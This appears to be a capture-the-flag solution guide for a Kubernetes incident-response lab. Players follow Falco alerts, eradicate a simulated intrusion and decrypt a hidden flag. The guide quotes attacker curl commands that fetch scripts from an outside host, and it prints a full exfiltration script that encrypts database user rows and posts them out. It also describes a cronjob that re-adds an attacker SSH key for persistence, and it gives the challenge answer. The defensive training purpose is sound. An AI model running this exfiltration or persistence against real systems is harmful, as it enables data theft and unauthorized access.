# It's Happening, Everybody Stay Calm!

*Solution Guide*

## Overview

A "live attack" is happening in real time. Players must monitor alerts, identify the source of the attack, and eradicate it to solve this challenge. Players should keep logs of the attack to find the attacker's location.

## Question 1

*After viewing Mattermost alerts, identify and eradicate the attack, including any sign of persistence. Upon completing these steps, initiate system check for automatic grading.*

The "Getting Started" section of the challenge document tells the players each team member was provided a Mattermost account to review incoming alerts. Five Mattermost accounts have been created. 

1. Log into Mattermost `chat.merch.codes` with given credentials. When the attack begins, alerts about unauthorized actions occurring in the cluster start arriving in the **Falco_Alerts** chat.
2. Review incoming alerts. Every alert is important as it guides you through the steps the attacker is performing live inside the cluster. 

### Incoming "Falco_Alerts" details

The order and amount of your alerts might be different.

- Informational alerts of topology's services being deployed.
- Critical Alert: "Launch Ingress Remote File Copy Tools in Container". Command ran was `curl -L0 http://123.45.67.110/files/kubectl --output kubectl`; executed from `coupons` pod.
- Critical Alert: "Launch Ingress Remote File Copy Tools in Container". Command ran was `curl -L0 http://123.45.67.110/files/cron/cron.yml --output cron.yml`; executed from `coupons` pod.
- Critical Alert: "Launch Ingress Remote File Copy Tools in Container". Command ran was `curl -L0 http://123.45.67.110/files/cron/verify.sh --output verify.sh`; executed from `coupons` pod.
- Critical Alert: "Launch Ingress Remote File Copy Tools in Container". Command ran was `curl -L0 http://123.45.67.110/files/cron/run.sh --output run.sh`; executed from `coupons` pod.
- Critical Alert: "Launch Ingress Remote File Copy Tools in Container". Command ran was `curl -L0 http://123.45.67.110/files/exfil/exfiltration.sh --output exfiltration.sh`; executed from `coupons` pod.
- Warning Alert: "Contact K8S API Server From Container". Command ran was `kubectl apply -f jobs.yaml`; executed from `coupons` pod.
- Warning Alert: "Contact K8S API Server From Container". Command ran was `kubectl get pods`; executed from `coupons` pod.
- Warning Alert: "Contact K8S API Server From Container". Command ran was `kubectl cp cron hostpath-exec-job-ms2kp:/host/root/.kube/`; executed from`coupons` pod.
- Warning Alert: "Contact K8S API Server From Container". Command ran was `kubectl cp exfil hostpath-exec-job-ms2kp:/host/root/.kube/`; executed from `coupons` pod.
- Warning Alert: "Contact K8S API Server From Container". Command ran was `kubectl exec -it hostpath-exec-job-ms2kp -- sh /host/root/.kube/cron/run.sh`; executed from `coupons` pod.
- Critical Alert: "Write below root". File created called: `exfiltration.sh`.
- Warning Alert: "Unauthorized Pod Attempted to Execute Curl/Wget". Here we see a `curl -X POST -F data=ENCRYPTED-MESSAGE http://123.45.67.110/upload` coming from a new pod called `data-analysis-ps87s`.
- Informational alerts of more stuff being created in the cluster. 

Upon following these alerts you'll notice the the following: 

- The attacker obtained access to the node via the `coupons` pod. Upon obtaining access, the attacker pulled five files from his malicious server into the `coupons` pod. These files were:
  1. kubectl binary
  2. cron.yml
  3. verify.sh
  4. run.sh
  5. exfiltration.sh

- After downloading those files, the next alert notifies the team that a new manifest called `jobs.yaml` was applied into the cluster, potentially creating a new job. 
- The attacker got a list of the running pods. 
- The attacker copied a directory into a malicious pod created by the attacker.
- The attacker performed a command inside the malicious pod to run the script `run.sh`. Given that in the next step, what the attacker did was create a new file inside the node, we can assume the attacker now has access to the node. 
- The attacker created a new pod sending encrypted data using curl to his malicious server repeatedly. 

3. Get a list of current pods running in the cluster. Remember, the first part of the challenge is to eradicate the attack while collecting useful information that can help us figure out the location of the attacker. You can get the list from the `k3s-server` (or `10.3.3.10`). From the Kali VM terminal, enter the following commands: 

```bash
ssh user@10.3.3.10
sudo su
kubectl get pods -o wide
```
These commands log you into the `k3s-server`, change *user* to *root* and get a list of running pods. The `-o wide` parameter allows you to observe in which node is each pod running. This is helpful to understand what node(s) might be affected. 

Here is the obtained list (your NAME, RESTARTS, and AGE columns might be different). 

```
NAME                                  READY   STATUS      RESTARTS   AGE     IP            NODE         NOMINATED NODE   READINESS GATES
postgres-6686d6df96-q42cv             1/1     Running     0          4m22s   10.42.1.149   k3s-server   <none>           <none>
pgadmin-5d455f8fdd-qhvjd              1/1     Running     0          4m22s   10.42.2.246   k3s-client   <none>           <none>
coupons-5b768cb99f-772z4              1/1     Running     0          4m20s   10.42.2.248   k3s-client   <none>           <none>
mattermost-app-64d9856f84-sw7l9       1/1     Running     0          4m21s   10.42.2.247   k3s-client   <none>           <none>
postfix-f4596498c-bgw4z               1/1     Running     0          4m19s   10.42.2.250   k3s-client   <none>           <none>
roundcubemail-66d94c49bc-4cfcb        1/1     Running     0          4m17s   10.42.2.252   k3s-client   <none>           <none>
dovecot-5678fc94b-sbqtr               1/1     Running     0          4m18s   10.42.2.251   k3s-client   <none>           <none>
falco-falcosidekick-test-connection   0/1     Completed   0          4m16s   10.42.1.152   k3s-server   <none>           <none>
falco-falcosidekick-f8f6bd75d-zt99f   1/1     Running     0          4m16s   10.42.1.150   k3s-server   <none>           <none>
falco-falcosidekick-f8f6bd75d-hn4cm   1/1     Running     0          4m16s   10.42.2.254   k3s-client   <none>           <none>
falco-d85nn                           1/1     Running     0          4m16s   10.42.2.253   k3s-client   <none>           <none>
falco-768g4                           1/1     Running     0          4m16s   10.42.1.151   k3s-server   <none>           <none>
keycloak-849cbbb5b7-hcd65             1/1     Running     0          4m19s   10.42.2.249   k3s-client   <none>           <none>
hostpath-exec-job-b9fht               1/1     Running     0          2m4s    10.42.2.2     k3s-client   <none>           <none>
data-analysis-88tpw                   1/1     Running     0          102s    10.42.2.3     k3s-client   <none>           <none>
verification-cronjob-28290374-5rn92   0/1     Completed   0          73s     10.42.2.4     k3s-client   <none>           <none>
verification-cronjob-28290375-s5stc   0/1     Completed   0          13s     10.42.2.5     k3s-client   <none>           <none>

```

There are some uncommonly named pods such as: `hostpath-exec-job`, `data-analysis`, and `verification-cronjob`.

The following commands can help you collect information from these pods: 

```bash
kubectl get pods <Name of running pod> -o yaml
kubectl describe pod <Name of running pod>
kubectl logs <Name of running pod>
```

Let's try them with the `hostpath-exec-job` pod. 

6. See the manifest used to deploy `hostpath-exec-job`:

```bash
# To simplify reading the data inside the pod, we can redirect the output to a file. 
kubectl get pods hostpath-exec-job-b9fht -o yaml > hostpath.yaml
```

Upon careful reading, we know this pod is mounting the host path as a volume to the pod--essentially allowing the attacker to access every file inside the node in which this pod is running. Running `kubectl describe` and `kubectl get logs` doesn't yield any interesting results in this case. 

7. Collect some information about the cronjob. The name itself hints this is a cronjob; let's see the running cronjobs using the following command: 

```bash
kubectl get cronjobs
```
...and the output is (your LAST SCHEDULE and AGE may be different):

```
NAME                   SCHEDULE    SUSPEND   ACTIVE   LAST SCHEDULE   AGE
verification-cronjob   * * * * *   False     0        6s              42m
```

It is running every minute. This is the meaning of `* * * * *` in the SCHEDULE.

8. Retrieve the yaml configuration used to deploy this cronjob: 

```bash
kubectl get cronjob verification-cronjob -o yaml > cronjob.yaml
```

Exploring this file yields a couple of interesting things:

  - The first detail is that there is an environment variable called MY_KEY that contains an SSH Key.
  - We can also see that there are two volumeMounts: one is mounting the entire file system of the node as well and the other is mounting `verify-key-script` into a directory called `script`.
  - Finally, we can see there is a configmap volume being used called `verify-key-script`.

9. Run `kubectl describe` and `kubectl get logs`; neither command yields any interesting results in this case. 
10. Before diving into the last pod we saw, let's take a look at this `configmap`:

```bash
kubectl get configmap verify-key-script -o yaml > verify.yaml
```

This script verifies the contents of `authorized_keys` of the host and, if it doesn't contain the key we saw before, it will add it. We'll test this in the next steps.

11. Recall when we first saw the logs in which node each pod was deployed. This pod was deployed in the `k3s-client` node, therefore, this action/script is executing in that system. `ssh` into that node and view the contents of the root `authorized_keys` file: 

```bash
ssh user@10.3.3.11
sudo su
cat /root/.ssh/authorized_keys
```

We can see the attacker ssh key.

12. Remove the key and see if it is added after a minute. 

```bash
echo "" > /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

13. After one full minute, again view the contents of the root `authorized_keys`. 

```bash
cat /root/.ssh/authorized_keys
```

14. It is there. Return to the `ks3-server`:

```bash
ssh user@10.3.3.10
sudo su
```

15. Explore the last pod we saw: 

```bash
kubectl get pod data-analysis-88tpw -o yaml > data.yaml
```

When we view the contents of *this* pod, note these details: 

- When the job is deployed, it executes a script called `grabber.sh`
- It <!--the job, the pod, or the script?-->has two containers: an `init container` and the regular container. The `init container` copies the `grabber.sh` script into the container and gives it the proper permissions.
- The job has three volume mounts: one is mounts the `grabber.sh` script pointing to `script-volume`; one mounts the `secret-volume`; and one mounts a service account.
- The job has two volumes of interest: one mounts the script by looking at a configmap called `data-grabber`; the other mounts `secret-volume` looking at a Kubernetes secret called `encryption-key-secret`. 

16. Explore the config map: 

```bash
kubectl get configmap data-grabber -o yaml > grabber.yaml
```

If you perform the next step, you can see that the `grabber.sh` section has poor formatting and spacing.

```bash
cat grabber.yaml
```

After you fix the formatting and indentation of the `grabber.sh` section, you will notice it looks similar to this: 

>Note: You don't need to run the script below. It is included to show how the `grabber.sh` section looks after formatting is fixed. 

```bash
#!/bin/bash

ENCRYPTION_KEY=$(cat /etc/secret-path/encryptionkey)
EXTERNAL_SERVER="http://123.45.67.110/upload"

export PGPASSWORD="tartans"

count=0

while IFS= read -r line
do
    # Encrypt the data
    encrypted_data=$(echo "$line" | openssl enc -aes-256-cbc -a -salt -pass pass:$ENCRYPTION_KEY -pbkdf2)

    echo "[INFO]: $encrypted_data"

    # Send the data to the external server
    curl -s -X POST -F "data=$encrypted_data" $EXTERNAL_SERVER
    echo ""
    
    count=$((count+1))

    if ((count % 15 == 0)); then
        # MY HACKER SIGNATURE
        echo "[Destination]: U2FsdGVkX1/b+zUrN2OVxnWnKUnkoM92EfsOja8ty6yV+h6/y9eBz0hIT85hSWtC"
    fi

    sleep 30
done < <(psql -h 10.3.3.10 -p 30432 -U root -d mattermost_db -c "SELECT * FROM users;")
```

After fixing the spacing, it is apparent that `grabber.sh` is grabbing rows from the **mattermost_db**, encrypting them, and forwarding them to an external server owned by the attacker. Once the count is a multiple of 15, it displays the **Destination**. 

17. Before stopping the attack, collect the logs of this pod. 

```bash
kubectl logs data-analysis-88tpw > data.log
```

18. We found a Kubernetes secret called `encryption-key-secret` on Step 15 inside the file we created called `data.yaml`. View the contents of this secret: 

```bash
kubectl get secret encryption-key-secret -o yaml > secret.yaml
```

19. You now have all the information needed for future analysis. Eradicate everything we found, including the source of the attack, the coupons deployment. Here are all the commands: 

```bash
kubectl delete deployment coupons
kubectl delete cronjob verification-cronjob
kubectl delete job hostpath-exec-job
kubectl delete job data-analysis
kubectl delete cm verify-key-script
kubectl delete cm data-grabber
kubectl delete secret encryption-key-secret
```

20. After removing the `verification-cronjob`, return to the `k3s-client` node and remove the attacker's ssh key to avoid future unauthorized logins and future attacks.

```bash
ssh user@10.3.3.11
sudo su
echo "" > /root/.ssh/authorized_keys
```

21. In a gamespace resource, go to `https://challenge.us` and type `Initiate` on the first block to initiate the system check of Part 1. If successful, the token is submitted on your behalf.

## Question 2

*Once you stop the attack, analyze the gathered data to identify the attacker's location. Enter the found location here.*

For the second part, find the attackers' location by analyzing the retrieved data. 

1. Review the `data-analysis` logs we found. 

```bash
cat data.log
```

Careful review of the logs of the pod tells us the attacker is sending an encrypted `Destination` block in every 15 rows sent to the external server.

2. Look at the `encryption-key-secret`. We have a variable called `encryptionkey`:

```yaml
apiVersion: v1
data:
  encryptionkey: ZWFkM2I0MWRlMDg5
kind: Secret
metadata:
  creationTimestamp: "2023-10-16T02:13:31Z"
  name: encryption-key-secret
  namespace: default
  resourceVersion: "1023356"
  uid: 2df67f16-a994-4f09-87a4-3b2c8f2a1f5f
type: Opaque
```

Kubernetes uses Base64 encoding when storing secrets, so, after decoding the `encryptedkey` variable: 

```bash
echo "ZWFkM2I0MWRlMDg5" | base64 -d
```

...we obtain: `ead3b41de089`. Store that for future use. 

3. Analyze the `grabber.sh`. The script tells us how it is encrypting each message. We can use the same format to decrypt the pre-encrypted `Destination` section we saw on the logs. (Beware: the pre-encrypted message is also found in the `grabber.sh` script as observed above, but, it might include new lines `\n` that you need to remove. Finding it in the logs is an easier experience).

```bash
# NOTICE THE ADDITION OF THE -d PARAMETER TO DECRYPT THE MESSAGE
echo "U2FsdGVkX1/b+zUrN2OVxnWnKUnkoM92EfsOja8ty6yV+h6/y9eBz0hIT85hSWtC" | openssl enc -aes-256-cbc -a -d -salt -pass pass:ead3b41de089 -pbkdf2
```

This gives you the coordinates. Well done!

```
Hidden coordinates: b49585
```